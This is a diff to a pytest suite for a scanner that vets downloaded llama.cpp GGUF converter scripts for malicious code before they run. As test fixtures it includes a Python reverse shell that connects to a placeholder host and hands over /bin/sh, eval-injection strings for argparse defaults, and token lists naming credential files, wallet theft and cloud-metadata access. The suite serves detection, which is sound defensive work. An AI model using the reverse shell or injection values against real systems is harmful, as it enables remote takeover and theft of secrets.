@@ -113,10 +113,14 @@ def test_clean_live_upstream_converter_has_no_findings(scan):
         response = requests.get(CONVERTER_URL, timeout = 30, headers = headers)
     except requests.exceptions.RequestException as exc:
         pytest.skip(f"network unreachable: {exc}")
-    if response.status_code in (403, 429, 503):
+    if response.status_code in (403, 429, 500, 502, 503, 504):
         pytest.skip(f"upstream rate-limited / unavailable: HTTP {response.status_code}")
-    if response.status_code != 200:
-        pytest.skip(f"upstream unavailable: HTTP {response.status_code}")
+    # A 404 is not an outage: it means the URL llama_cpp.py downloads from is gone,
+    # which breaks GGUF export whatever this scan does. Fail rather than go green.
+    assert response.status_code == 200, (
+        f"{CONVERTER_URL} returned HTTP {response.status_code}. "
+        f"LLAMA_CPP_CONVERT_FILE needs updating."
+    )
     findings = scan.scan_converter_source(response.content, CONVERTER_URL)
     assert findings == [], (
         "live llama.cpp master trips the converter scan, which would warn on every "
@@ -217,7 +221,9 @@ def test_flagged_payload_is_reported(scan, name):
     findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
     checks = [f.check for f in findings]
     assert expected_check in checks, checks
-    assert all(f.severity in (scan.CRITICAL, scan.HIGH) for f in findings), findings
+    reported = [f for f in findings if f.check == expected_check]
+    assert reported[0].severity in (scan.CRITICAL, scan.HIGH)
+    assert reported[0].evidence.strip(), reported
 
 
 def test_flagged_payload_hidden_in_a_real_converter_is_still_reported(scan):
@@ -246,26 +252,37 @@ def test_flagged_findings_carry_evidence(scan):
 @pytest.mark.parametrize(
     "default",
     [
-        b"__import__('os').system",
-        b"[x**2",
-        b"open('/etc/passwd').read",
         b"{'a':1}['a']",
+        b"sys.modules['os'].environ",
+        b"__builtins__.__dict__['eval']",
     ],
 )
-def test_flagged_non_literal_argparse_default(scan, default):
+def test_flagged_argparse_default_that_would_evaluate(scan, default):
+    """What survives the capture and still evaluates: subscripts and lookups."""
     source = b'parser.add_argument("--outtype", type=str, default=' + default + b")\n"
     findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
-    assert any("argparse default" in f.check for f in findings), [f.check for f in findings]
-    assert all(f.severity == scan.CRITICAL for f in findings if "argparse" in f.check)
+    argparse_findings = [f for f in findings if "argparse default" in f.check]
+    assert argparse_findings, [f.check for f in findings]
+    assert all(f.severity == scan.CRITICAL for f in argparse_findings)
+    assert all(default.decode() in f.evidence for f in argparse_findings)
 
 
 @pytest.mark.parametrize(
     "default",
-    [b'"f16"', b'"auto"', b"0", b"None", b'"store_true"', b"DEFAULT_OUTTYPE", b"gguf.LlamaFileType"],
+    [
+        # Every token upstream has actually used.
+        b'"f16"', b'"auto"', b'"0"', b"0", b"None", b'"store_true"',
+        # Plain names, which have no call syntax to invoke.
+        b"DEFAULT_OUTTYPE", b"gguf.LlamaFileType",
+        # Benign defaults the capture regex truncates. `[0, 1]` arrives as `[0`
+        # and `os.cpu_count()` as `os.cpu_count(`, neither of which parses, so
+        # eval() raises inside llama_cpp.py's own try/except and nothing runs.
+        # Reporting these would warn on a converter that did nothing wrong.
+        b"[0, 1]", b"(1, 2)", b'"chat template"', b"os.cpu_count()", b"Path.cwd()",
+        b"globals()['os']", b"argparse.SUPPRESS", b"[]", b"{}",
+    ],
 )
-def test_clean_literal_or_named_argparse_default_is_quiet(scan, default):
-    """Every default token seen across six years of upstream releases is one of
-    these shapes, plus plain names, which cannot call anything under eval()."""
+def test_clean_argparse_default_that_cannot_run_is_quiet(scan, default):
     source = b'parser.add_argument("--outtype", type=str, default=' + default + b")\n"
     findings = [
         f for f in scan.scan_converter_source(source, "x.py") if "argparse" in f.check
@@ -273,9 +290,35 @@ def test_clean_literal_or_named_argparse_default_is_quiet(scan, default):
     assert findings == [], findings
 
 
+def test_clean_truncated_defaults_match_what_llama_cpp_does_with_them(scan, llama_cpp):
+    """The tokens the rule stays quiet about are exactly the ones eval() rejects.
+
+    Not an assumption: the capture runs, then each token is put through the same
+    eval() llama_cpp.py performs, and the quiet ones must be the ones that raise.
+    """
+    source = (
+        b'parser.add_argument("--a", default=[0, 1])\n'
+        b'parser.add_argument("--b", default=os.cpu_count())\n'
+        b'parser.add_argument("--c", default="chat template")\n'
+    )
+    tokens = [d.decode() for _flag, d in llama_cpp.RE_ARGPARSE_DEFAULT.findall(source)]
+    assert tokens == ["[0", "os.cpu_count(", '"chat'], tokens
+    for token in tokens:
+        with pytest.raises(SyntaxError):
+            eval(token)  # noqa: S307 - the point is that this raises
+    assert [f for f in scan.scan_converter_source(source, "x.py") if "argparse" in f.check] == []
+
+
 def test_argparse_regex_is_the_one_llama_cpp_evals(scan, llama_cpp):
-    """The scan and the eval sink must read the same tokens, by construction."""
-    assert llama_cpp.RE_ARGPARSE_DEFAULT is scan.RE_ARGPARSE_DEFAULT
+    """The scan and the eval sink read the same tokens.
+
+    Asserted on the pattern text and flags rather than object identity: the
+    fixtures load both modules by path, so llama_cpp.py takes its ImportError
+    fallback and builds a second module object. In a normal package import the
+    two are the same object; either way what matters is that the regex agrees.
+    """
+    assert llama_cpp.RE_ARGPARSE_DEFAULT.pattern == scan.RE_ARGPARSE_DEFAULT.pattern
+    assert llama_cpp.RE_ARGPARSE_DEFAULT.flags == scan.RE_ARGPARSE_DEFAULT.flags
 
 
 def test_argparse_regex_still_matches_what_the_flag_parser_expects(scan):
@@ -393,11 +436,123 @@ def test_undecodable_bytes_do_not_crash_the_scan(scan):
     assert scan.scan_converter_source(b"\xff\xfe\x00bad bytes\n", "x.py") == []
 
 
-def test_oversized_input_is_truncated_not_refused(scan):
-    source, _ = _PAYLOADS["reverse shell"]
-    padded = source + b"# pad\n" * 10
-    assert scan.scan_converter_source(padded, "x.py")
-    assert scan.MAX_SCAN_BYTES > 400 * 1024  # room for the old monolith
+def test_scan_cap_leaves_room_for_the_largest_real_converter(scan):
+    assert scan.MAX_SCAN_BYTES > 500 * 1024
+
+
+def test_oversized_input_reports_that_it_was_only_partly_scanned(scan, monkeypatch):
+    """Past the cap the tail is not scanned, and that has to be said out loud.
+
+    The whole file is still patched, written and executed, so a silent partial
+    scan would look exactly like a clean one.
+    """
+    monkeypatch.setattr(scan, "MAX_SCAN_BYTES", 2048)
+    payload, expected_check = _PAYLOADS["reverse shell"]
+    head = payload + b"# pad\n" * 1000
+    findings = scan.scan_converter_source(head, "x.py")
+    checks = [f.check for f in findings]
+    assert expected_check in checks, checks
+    assert any("larger than the scan cap" in c for c in checks), checks
+
+    # Same payload past the cap: missed, which is what the cap finding warns about.
+    tail = b"# pad\n" * 1000 + payload
+    checks = [f.check for f in scan.scan_converter_source(tail, "x.py")]
+    assert expected_check not in checks, checks
+    assert any("larger than the scan cap" in c for c in checks), checks
+
+
+def test_within_the_cap_nothing_is_reported_about_truncation(scan):
+    findings = scan.scan_converter_source(GENUINE_CONVERTER.read_bytes(), "x.py")
+    assert not any("scan cap" in f.check for f in findings), findings
+
+
+# ---------------------------------------------------------------------------
+# The whole-file patterns must not be stallable by the bytes they scan.
+# ---------------------------------------------------------------------------
+
+
+def test_pattern_evaluation_agrees_with_the_pinned_patterns(scan):
+    """Fuzz the linear-time evaluation against `pattern.search` itself.
+
+    Several canonical patterns are shaped `A.*B.*C` under DOTALL and are
+    evaluated as ordered searches instead of one backtracking match. That is only
+    allowed if it answers the same question, so 8000 texts assembled from the
+    tokens those patterns key on are put through both, for all 23 patterns.
+    """
+    import random
+
+    tokens = [
+        "socket", ".connect", "subprocess", "sh", "bash", "cmd", "/bin/sh",
+        "pty.spawn", "os.dup2", "platform.system", "if", "Linux", "Windows",
+        "Darwin", "while True", "time.sleep", "urlopen", "requests.get",
+        "chr(1)", "marshal.loads", "b64decode(", "history", "read", "/tmp/x",
+        "os.system", "chmod", "+x", "rotate=", "lambda", "bytearray([1])",
+        "RSA PUBLIC KEY", "MIIabcdefghijklmnopqrstu", "open('~/.ssh/id_rsa')",
+        "tarfile.open(", ".env", "virtualbox", "hardware", "vmware", "detect",
+        "Popen", "open(", "(", ")", "[", "]", "=", "\n", "  ", "x", "dig ",
+        "nslookup", "os.environ", "TOKEN", "zlib.decompress", "169.254.169.254",
+        "/etc/cron", "docker run", "wallet.dat", "openssl enc", "exec(", ".text(",
+    ]
+    rng = random.Random(31337)
+    mismatches = []
+    for _ in range(8000):
+        text = "".join(rng.choice(tokens) for _ in range(rng.randint(1, 50)))
+        for name, pattern in scan.VENDORED_PATTERNS.items():
+            if scan._matches(pattern, text) != bool(pattern.search(text)):
+                mismatches.append((name, text))
+    assert mismatches == [], mismatches[:3]
+
+
+@pytest.mark.parametrize(
+    "name,filler",
+    [
+        ("RE_REVERSE_SHELL", "socket\n.connect\n"),
+        ("RE_ANTI_ANALYSIS", "platform.system()\nif x:\n"),
+        ("RE_C2_POLLING", "while True\ntime.sleep(\n"),
+        ("RE_CRED_ACCESS", "open(aaaaaaaaaa\n"),
+        ("RE_TEMP_EXEC", "/tmp/aaaa\n"),
+        ("RE_OBFUSCATION", "chr(1)\n"),
+        ("RE_FS_ENUM", "history\n"),
+    ],
+)
+def test_hostile_input_cannot_stall_a_pattern(scan, name, filler):
+    """A file of near-misses used to take 68s on one pattern and grew cubically.
+
+    The converter bytes are the untrusted input, so a pattern that a crafted file
+    can stall is a way to wedge every GGUF export, and a hang is the one failure
+    the try/except around the scan cannot catch.
+    """
+    import time
+
+    text = filler * (200 * 1024 // len(filler))
+    pattern = scan.VENDORED_PATTERNS[name]
+    started = time.perf_counter()
+    scan._matches(pattern, text)
+    assert time.perf_counter() - started < 5.0
+
+
+def test_hostile_file_scans_in_reasonable_time(scan):
+    import time
+
+    hostile = (
+        "socket\n.connect\nwhile True\ntime.sleep(\nplatform.system()\nif y:\n"
+        "chr(1)\nhistory\n/tmp/a\nopen(aaa\nexec(aaa\n.add(aaa\nRSA PUBLIC KEY\n"
+        "bytearray([1])\nrotate=\nlambda\nos.environ KEY\n"
+    ) * 3000
+    started = time.perf_counter()
+    scan.scan_converter_source(hostile, "x.py")
+    assert time.perf_counter() - started < 10.0
+
+
+def test_one_enormous_line_does_not_stall_evidence_extraction(scan):
+    """Evidence is line-scoped, which is only a bound if lines are bounded."""
+    import time
+
+    source = ("socket " + "a" * 200000 + " .connect subprocess\n").encode()
+    started = time.perf_counter()
+    findings = scan.scan_converter_source(source, "x.py")
+    assert time.perf_counter() - started < 10.0
+    assert any("Reverse shell" in f.check for f in findings), [f.check for f in findings]
 
 
 # ---------------------------------------------------------------------------
@@ -486,6 +641,75 @@ def test_export_of_a_clean_local_converter_is_unchanged(llama_cpp, tmp_path, mon
         )
     assert os.path.isfile(patched)
     assert "suspicious pattern" not in caplog.text
+
+
+def test_export_strict_mode_refuses_a_downloaded_converter_and_writes_nothing(
+    llama_cpp, tmp_path, monkeypatch,
+):
+    """Drives the real export path with downloaded bytes and strict mode set.
+
+    Covers the `except ConverterScanError: raise` clause: the refusal must keep
+    its own message rather than come back relabelled as an introspection failure,
+    and no patched script may reach disk.
+    """
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    payload = _MINIMAL_CONVERTER + (
+        b"\nimport socket, subprocess\n"
+        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
+        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
+    )
+
+    class _Response:
+        content = payload
+
+        def raise_for_status(self):
+            return None
+
+    scripts_dir = tmp_path / "llama.cpp"
+    scripts_dir.mkdir()
+    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
+    monkeypatch.setattr(llama_cpp.requests, "get", lambda *a, **k: _Response())
+    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()
+
+    with pytest.raises(llama_cpp.ConverterScanError) as excinfo:
+        llama_cpp._download_convert_hf_to_gguf_cached(
+            "unsloth_convert_hf_to_gguf", None, None,
+        )
+    message = str(excinfo.value)
+    assert "Refusing to run" in message
+    assert "loading/introspection" not in message
+    assert not (scripts_dir / "unsloth_convert_hf_to_gguf.py").exists()
+
+
+def test_export_of_a_downloaded_converter_is_not_refused_without_strict_mode(
+    llama_cpp, tmp_path, monkeypatch, caplog,
+):
+    """Same flagged download, strict mode unset: warn and carry on."""
+    payload = _MINIMAL_CONVERTER + (
+        b"\nimport socket, subprocess\n"
+        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
+        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
+    )
+
+    class _Response:
+        content = payload
+
+        def raise_for_status(self):
+            return None
+
+    scripts_dir = tmp_path / "llama.cpp"
+    scripts_dir.mkdir()
+    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
+    monkeypatch.setattr(llama_cpp.requests, "get", lambda *a, **k: _Response())
+    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()
+
+    with caplog.at_level("WARNING"):
+        patched, _text, _vision = llama_cpp._download_convert_hf_to_gguf_cached(
+            "unsloth_convert_hf_to_gguf", None, None,
+        )
+    assert os.path.isfile(patched)
+    assert "suspicious pattern" in caplog.text
+    assert CONVERTER_URL in caplog.text
 
 
 def test_export_warns_but_completes_on_a_flagged_local_converter(
